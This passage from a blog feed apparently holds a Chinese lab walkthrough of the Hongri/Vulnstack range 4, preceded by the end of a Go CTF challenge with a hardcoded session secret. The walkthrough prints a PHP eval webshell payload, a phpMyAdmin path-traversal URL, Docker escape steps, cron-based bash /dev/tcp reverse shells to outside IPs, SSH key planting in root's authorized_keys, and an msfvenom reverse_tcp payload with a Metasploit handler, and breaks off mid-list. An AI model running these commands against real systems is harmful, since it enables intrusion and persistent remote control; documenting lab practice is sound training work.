&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;package &lt;span class=&#34;hljs-selector-tag&#34;&gt;main&lt;/span&gt;&lt;br&gt;&lt;br&gt;import (&lt;br&gt;	_ &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;embed&amp;quot;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;fmt&amp;quot;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;os&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;github.com/gin-contrib/sessions&amp;quot;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;github.com/gin-contrib/sessions/cookie&amp;quot;&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;github.com/gin-gonic/gin&amp;quot;&lt;/span&gt;&lt;br&gt;)&lt;br&gt;&lt;br&gt;func &lt;span class=&#34;hljs-selector-tag&#34;&gt;main&lt;/span&gt;() &amp;#123;&lt;br&gt;	port := os&lt;span class=&#34;hljs-selector-class&#34;&gt;.Getenv&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;PORT&amp;quot;&lt;/span&gt;)&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; port == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &amp;#123;&lt;br&gt;		port = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;8888&amp;quot;&lt;/span&gt;&lt;br&gt;	&amp;#125;&lt;br&gt;	r := gin&lt;span class=&#34;hljs-selector-class&#34;&gt;.Default&lt;/span&gt;()&lt;br&gt;	store := cookie&lt;span class=&#34;hljs-selector-class&#34;&gt;.NewStore&lt;/span&gt;(&lt;span class=&#34;hljs-selector-attr&#34;&gt;[]&lt;/span&gt;byte(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;woW_you-g0t_sourcE_co6e&amp;quot;&lt;/span&gt;))&lt;br&gt;	r&lt;span class=&#34;hljs-selector-class&#34;&gt;.Use&lt;/span&gt;(sessions&lt;span class=&#34;hljs-selector-class&#34;&gt;.Sessions&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;session&amp;quot;&lt;/span&gt;, store))&lt;br&gt;	r&lt;span class=&#34;hljs-selector-class&#34;&gt;.GET&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/flag&amp;quot;&lt;/span&gt;, func(c *gin.Context) &amp;#123;&lt;br&gt;		session := sessions&lt;span class=&#34;hljs-selector-class&#34;&gt;.Default&lt;/span&gt;(c)&lt;br&gt;		c&lt;span class=&#34;hljs-selector-class&#34;&gt;.String&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;, session&lt;span class=&#34;hljs-selector-class&#34;&gt;.Get&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;FLAG&amp;quot;&lt;/span&gt;).(string))&lt;br&gt;	&amp;#125;)&lt;br&gt;	r&lt;span class=&#34;hljs-selector-class&#34;&gt;.Run&lt;/span&gt;(fmt&lt;span class=&#34;hljs-selector-class&#34;&gt;.Sprintf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;:%s&amp;quot;&lt;/span&gt;, port))&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <updated>2022-02-13T13:03:05.000Z</updated>
    </entry>
    <entry>
        <id>http://blog.m1n.me/2021/11/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0/</id>
        <title>红日靶场(四)笔记</title>
        <link rel="alternate" href="http://blog.m1n.me/2021/11/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0/"/>
        <content type="html">&lt;p&gt;红日靶场四学习记录&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;因为做的过程中，时间跨度比较大，前半段是打的公司的靶场，后半段自己搭建靶场，故 IP 有所变动。拓扑如下：&lt;br&gt;
&lt;a href=&#34;http://vulnstack.qiyuanxuetang.net/vuln/detail/6/&#34;&gt;http://vulnstack.qiyuanxuetang.net/vuln/detail/6/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041547309.png&#34; alt=&#34;13&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;Ubuntu 用 Docker 跑了三个 Web 服务，一台 Win7 域成员机，一台 Winserver2008 域控&lt;/p&gt;
&lt;h2 id=&#34;外网打点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#外网打点&#34;&gt;#&lt;/a&gt; 外网打点&lt;/h2&gt;
&lt;h3 id=&#34;2001端口struct2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2001端口struct2&#34;&gt;#&lt;/a&gt; 2001 端口 Struct2&lt;/h3&gt;
&lt;p&gt;Burp 抓包看到 Struct2 字样，直接工具测试一把梭&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2002端口tomcat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2002端口tomcat&#34;&gt;#&lt;/a&gt; 2002 端口 Tomcat&lt;/h3&gt;
&lt;p&gt;可以参考 https://www.freebuf.com/articles/web/271892.html&lt;/p&gt;
&lt;p&gt;使用 PUT 上传冰蝎马，注意直接上传 &lt;code&gt;/shell.jsp&lt;/code&gt;  不行哦&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2003端口phpmyadmin-481&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2003端口phpmyadmin-481&#34;&gt;#&lt;/a&gt; 2003 端口 phpMyAdmin 4.8.1&lt;/h3&gt;
&lt;p&gt;可以参考 https://www.dazhuanlan.com/oliiiflorrr/topics/1144804&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;验证漏洞是否存在&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用 SELECT 语句后包含 session 文件来 get shell，写 shell &lt;code&gt;SELECT &amp;quot;&amp;lt;?php phpinfo();file_put_contents(&#39;m1n.php&#39;, &#39;&amp;lt;?=@eval($_POST[1]);&#39;);?&amp;gt;&amp;quot;  &lt;/code&gt; ，访问发现 &lt;code&gt;http://10.0.5.100:2003/index.php?target=db_sql.php?/../../../../../../../../../tmp/sess_a851fdf11a88214580de888e61ed1867&lt;/code&gt;  出现 phpinfo，用蚁剑连接 m1n.php 即可。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;docker逃逸2002端口的tomcat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker逃逸2002端口的tomcat&#34;&gt;#&lt;/a&gt; Docker 逃逸（2002 端口的 Tomcat）&lt;/h2&gt;
&lt;h3 id=&#34;如何判断是否在docker里&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#如何判断是否在docker里&#34;&gt;#&lt;/a&gt; 如何判断是否在 Docker 里&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;检查  &lt;code&gt;/.dockerenv&lt;/code&gt;  文件是否存在&lt;/li&gt;
&lt;li&gt;检查  &lt;code&gt;/proc/1/cgroup&lt;/code&gt;  内是否包含 Docker 等字符串&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;尝试dirtycow漏洞逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试dirtycow漏洞逃逸&#34;&gt;#&lt;/a&gt; 尝试 DirtyCow 漏洞逃逸&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;下载 POC：&lt;a href=&#34;https://github.com/scumjr/dirtycow-vdso&#34;&gt;https://github.com/scumjr/dirtycow-vdso&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;编译，上传，监听，运行，没反应，下一个。&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;git clone https:&lt;span class=&#34;hljs-regexp&#34;&gt;//gi&lt;/span&gt;thub.com&lt;span class=&#34;hljs-regexp&#34;&gt;/scumjr/&lt;/span&gt;dirtycow-vdso.git&lt;br&gt;cd dirtycow-vdso&lt;br&gt;make&lt;br&gt;./&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xdeadbeef ip:port&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;尝试runc容器逃逸漏洞cve-2019-5736&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试runc容器逃逸漏洞cve-2019-5736&#34;&gt;#&lt;/a&gt; 尝试 runC 容器逃逸漏洞（CVE-2019-5736）&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;下载 POC：&lt;a href=&#34;https://github.com/Frichetten/CVE-2019-5736-PoC&#34;&gt;https://github.com/Frichetten/CVE-2019-5736-PoC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;改 POC，把 payload 那行改成自己 VPS 的 IP&lt;/li&gt;
&lt;li&gt;编译（建议 Linux 环境下） &lt;code&gt;CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;上传文件，监听端口，执行，没反应，下一个。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;尝试特权模式逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试特权模式逃逸&#34;&gt;#&lt;/a&gt; 尝试特权模式逃逸&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;fdisk -l&lt;/code&gt;  查看磁盘&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在根目录下创建文件夹，把 /dev/sda1 挂在到该文件夹&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;mkdir&lt;/span&gt; /m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;mount&lt;/span&gt; /dev/sda&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; /m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可以看到宿主机的文件都到了 /m1n 目录下&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041548215.png&#34; alt=&#34;image-20210816152534150&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;尝试写定时任务来反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试写定时任务来反弹shell&#34;&gt;#&lt;/a&gt; 尝试写定时任务来反弹 shell&lt;/h4&gt;
&lt;p&gt;参考：&lt;a href=&#34;https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/&#34;&gt;https://m3lon.github.io/2019/03/18 / 解决 ubuntu-crontab 反弹 shell 失败的问题 /&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;写文件到 &lt;code&gt;/var/spool/cron/crontabs/root&lt;/code&gt; ，注意写到 &lt;code&gt;/var/spool/cron/root&lt;/code&gt;  不行嗷&lt;/li&gt;
&lt;li&gt;同时注意 root 文件的权限必须为 600&lt;/li&gt;
&lt;li&gt;注意定时任务文件内容中，路径要用绝对路径，建议把命令写成 &lt;code&gt;.sh&lt;/code&gt;  文件，然后 &lt;code&gt;chmod +x&lt;/code&gt; ，然后调用，不容易出错&lt;/li&gt;
&lt;li&gt;也可以 &lt;code&gt;*/1 * * * *  bash -c &amp;quot;bash -i  &amp;gt;&amp;amp;/dev/tcp/123.207.x.x/1234 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在本地的 Ubuntu20 虚拟机中成功反弹 shell，但是靶场环境下没法成功，写入了定时任务必须 restart 才可以执行，否则不执行，无奈。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;定时任务相关笔记：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;定时任务有时无法看到报错信息，可以这样获取报错信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\* * * * * &#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.106/7777 0&amp;gt;&amp;amp;1&#39;&amp;gt;/tmp/error.txt 2&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;定时任务查看日志：&lt;a href=&#34;https://www.cnblogs.com/zhangshengxiang/p/11842326.html&#34;&gt;https://www.cnblogs.com/zhangshengxiang/p/11842326.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;（1）查看系统日志直接： &lt;code&gt;tail -f /var/log/syslog&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;（2）查看 crontab 日志：&lt;/p&gt;
&lt;p&gt;​	方法 1&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;. 修改rsyslog文件，将&lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;rsyslog.d/&lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;-default.conf 文件中的&lt;span class=&#34;hljs-comment&#34;&gt;#cron.*前的#删掉；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;. 重启rsyslog服务service rsyslog restart&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;. 重启cron服务service cron restart&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	方法 2&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;. 编辑 &lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;syslog.conf，并且打开以cron.*开始的那行注释。&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;. 运行 &lt;span class=&#34;hljs-regexp&#34;&gt;/etc/i&lt;/span&gt;nit.d/sysklogd restart&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;. 运行 &lt;span class=&#34;hljs-regexp&#34;&gt;/etc/i&lt;/span&gt;nit.d/cron restart&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	查看 cron 日志&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;. linux&lt;br&gt;看 &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/cron这个文件就可以，可以用tail -f /&lt;/span&gt;var&lt;span class=&#34;hljs-regexp&#34;&gt;/log/&lt;/span&gt;cron观察（或者&lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log/cron.log）&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;. unix&lt;br&gt;在 &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;spool&lt;span class=&#34;hljs-regexp&#34;&gt;/cron/&lt;/span&gt;tmp文件中，有croutXXX001864的tmp文件，tail 这些文件就可以看到正在执行的任务了。&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;. mail任务&lt;br&gt;在 &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;spool&lt;span class=&#34;hljs-regexp&#34;&gt;/mail/&lt;/span&gt;root 文件中，有crontab执行日志的记录，用tail -f &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;spool&lt;span class=&#34;hljs-regexp&#34;&gt;/mail/&lt;/span&gt;root 即可查看最近的crontab执行情况&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;尝试写ssh公钥来连接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试写ssh公钥来连接&#34;&gt;#&lt;/a&gt; 尝试写.ssh 公钥来连接&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;本地生成公私钥&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;ssh&lt;/span&gt;-keygen -f m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;chmod&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;600&lt;/span&gt; m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;把 m1n.pub 文件上传到服务器的 &lt;code&gt;/root/.ssh/&lt;/code&gt;  目录下（注意，是 /m1n 下的 /root/.ssh），没有这个目录就创建这个目录&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;把 m1n.pub 的文件内容写到 authorized_keys 文件中 &lt;code&gt;cat m1n.pub &amp;gt; authorized_keys&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后 &lt;code&gt;ssh -i m1n root@ip&lt;/code&gt;  连接，即可&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;踩坑笔记：不要写公钥到 &lt;code&gt;/home/ubuntu/.ssh/&lt;/code&gt;  目录下，连不上。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;内网渗透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内网渗透&#34;&gt;#&lt;/a&gt; 内网渗透&lt;/h2&gt;
&lt;h3 id=&#34;传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#传&#34;&gt;#&lt;/a&gt; 传🐎&lt;/h3&gt;
&lt;h4 id=&#34;msf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf&#34;&gt;#&lt;/a&gt; MSF🐎&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;生成 msf🐎&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.192.168.145 LPORT=4444 -f elf &amp;gt; mshell.elf&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;把🐎儿传到目标机子上面&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;攻击机执行以下&lt;/p&gt;
&lt;figure class=&#34;highlight routeros&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;use exploit/multi/handler&lt;br&gt;&lt;span class=&#34;hljs-builtin-name&#34;&gt;set&lt;/span&gt; payload linux/x64/meterpreter/reverse_tcp&lt;br&gt;&lt;span class=&#34;hljs-builtin-name&#34;&gt;set&lt;/span&gt; lhost 10.192.168.145&lt;br&gt;&lt;span class=&#34;hljs-builtin-name&#34;&gt;set&lt;/span&gt; lport 4444&lt;br&gt;run&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目标机器添加权限后执行 mshell.elf&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;kali 接收到 shell&lt;/p&gt;
